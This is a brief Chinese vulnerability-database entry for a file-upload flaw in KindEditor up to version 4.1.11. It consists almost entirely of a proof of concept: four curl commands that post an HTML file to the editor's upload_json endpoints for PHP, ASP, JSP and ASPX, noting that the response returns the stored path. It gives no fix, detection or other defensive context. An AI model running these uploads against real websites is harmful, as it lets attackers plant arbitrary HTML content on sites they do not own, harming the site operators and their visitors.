---
title: 'kindeditor上传漏洞'
date: Tue, 22 Sep 2020 16:48:59 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

kindeditor <= 4.1.11

### 漏洞POC

```
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file 
​```返回值为路径 
```
![](kindeditor%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/wp_editor_md_426f629be38b94a1a89e63d533be9467.jpg)